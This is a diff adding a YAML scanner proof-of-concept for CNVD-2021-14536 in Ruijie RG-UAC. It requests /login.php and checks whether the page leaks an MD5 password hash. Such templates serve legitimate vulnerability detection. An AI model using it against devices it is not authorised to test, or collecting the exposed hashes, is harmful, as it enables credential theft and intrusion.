@@ -1,0 +1,18 @@
+detail:
+  author: jweny(https://github.com/jweny)
+  links:
+  - https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247483972&idx=1&sn=b51678c6206a533330b0279454335065
+expression: r0()
+manual: true
+name: poc-yaml-ruijie-uac-cnvd-2021-14536
+rules:
+  r0:
+    expression: "response.status == 200 && response.body.bcontains(b\"<title>RG-UAC\u767B\
+      \u5F55\u9875\u9762</title>\") && response.body.bcontains(b\"get_dkey_passwd\"\
+      ) && \"\\\"password\\\":\\\"[a-f0-9]{32}\\\"\".bmatches(response.body)"
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /login.php
+transport: http
